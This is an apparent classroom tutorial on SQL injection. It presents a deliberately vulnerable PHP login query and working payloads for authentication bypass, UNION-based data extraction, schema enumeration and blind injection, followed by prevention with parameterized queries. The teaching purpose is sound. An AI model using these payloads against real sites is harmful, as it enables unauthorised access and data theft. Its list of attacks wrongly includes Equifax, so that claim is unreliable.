# SQL Injection: From Database Basics to Web Exploitation

## What is SQL?

**SQL (Structured Query Language)** is the standard language for managing and manipulating databases.

Think of a database like a giant collection of excel spreadsheets (tables) containing records (rows) with specific information (columns), that are typically related in some manner.

### Basic SQL Commands

**SELECT** - Retrieve data
```sql
SELECT username, email FROM users WHERE id = 1;
```

**INSERT** - Add new data
```sql
INSERT INTO users (username, password) VALUES ('alice', 'secret123');
```

**UPDATE** - Modify existing data
```sql
UPDATE users SET email = 'newemail@example.com' WHERE username = 'alice';
```

**DELETE** - Remove data
```sql
DELETE FROM users WHERE id = 5;
```

---

## How Websites Use SQL

### The Web Application Stack

1. **Frontend** (HTML/CSS/JavaScript) - What users see
2. **Backend** (PHP/Python/Node.js) - Application logic
3. **Database** (MySQL/PostgreSQL/MongoDB/Elasticsearch) - Data storage

### Example: Login System

When you log into a website:

1. You enter username: `admin` and password: `password123`
2. The website runs a query like:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
```
3. If a record is found → Login successful
4. If no record is found → Login failed

---

## What is SQL Injection?

**SQL Injection occurs when user input is directly inserted into SQL queries without proper validation or sanitization.**

Instead of treating user input as data, the database interprets it as SQL commands.

### Vulnerable Code Example

```php
// DON'T DO THIS - Vulnerable!
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($connection, $query);
```

---

## Basic SQL Injection Techniques

### 1. Authentication Bypass

**Normal Login:**
- Username: `admin`
- Password: `password123`
- Query: `SELECT * FROM users WHERE username = 'admin' AND password = 'password123';`

**Injection Attack:**
- Username: `admin'--`
- Password: `anything`
- Query: `SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything';`

The `--` comments out the password check, bypassing authentication!

### 2. Always True Conditions

**Classic injection:**
- Username: `' OR '1'='1' --`
- Password: `anything`
- Query: `SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything';`

Since `'1'='1'` is always true, this returns all users and typically logs you in as the first user (often admin).

### 3. Union-Based Injection

**Goal:** Extract data from other tables

```sql
' UNION SELECT username, password FROM admin_users --
```

This combines results from the original query with data from the admin_users table.

---

## Advanced SQL Injection Techniques

### Information Gathering

**Database Version:**
```sql
' UNION SELECT version(), database() --
```

**List Tables:**
```sql
' UNION SELECT table_name, null FROM information_schema.tables --
```

**List Columns:**
```sql
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users' --
```

### Boolean-Based Blind Injection

When you can't see query results directly, but can determine if a query is true or false:

```sql
' AND (SELECT COUNT(*) FROM users) > 10 --
```

If the page loads normally → more than 10 users exist
If the page errors → 10 or fewer users exist

### Time-Based Blind Injection

Force the database to wait, indicating successful injection:

```sql
' AND (SELECT SLEEP(5)) --
```

If the page takes 5 seconds to load → injection successful

---

## Real-World Impact

### What Attackers Can Do

1. **Steal sensitive data** - passwords, credit cards, personal information
2. **Bypass authentication** - access admin panels
3. **Modify data** - change prices, delete records
4. **Execute system commands** - in some cases, gain server access

### Famous SQL Injection Attacks

- **Heartland Payment Systems (2008)** - 134 million credit cards stolen
- **Sony Pictures (2011)** - 1 million user accounts compromised
- **Equifax (2017)** - 147 million people's personal data exposed

---

## Detection and Prevention

### How to Find SQL Injection

**Manual Testing:**
- Try single quotes: `'`
- Test with: `' OR '1'='1`
- Look for error messages revealing database structure

**Automated Tools:**
- SQLMap - powerful automated SQL injection tool
- Burp Suite - web application security testing
- OWASP ZAP - free security testing proxy

### Prevention Techniques

**1. Parameterized Queries/Prepared Statements**
```php
// SECURE - Use prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

**2. Input Validation**
- Whitelist allowed characters
- Limit input length
- Use regex patterns

**3. Least Privilege**
- Database users should only have necessary permissions
- Don't use admin accounts for web applications

**4. Error Handling**
- Don't reveal database errors to users
- Log errors securely for debugging

---

## Practice Challenge Setup

For hands-on practice, we'll hit some problems that includes:

1. **Basic bypass** - Log in without knowing credentials
2. **Data extraction** - Find hidden information

**Common payloads to try:**
- `admin'--`
- `' OR '1'='1' --`
- `' UNION SELECT null, version() --`
- `' AND (SELECT COUNT(*) FROM users) > 0 --`

---

## Key Takeaways

1. **SQL injection is about exploiting trust** - never trust user input
2. **Simple inputs can have massive impact** - one quote can compromise everything
3. **Defense in depth** - use multiple protection layers
4. **Always use parameterized queries** - they're your best defense

---

## Questions?

Ready to try some SQL injection challenges?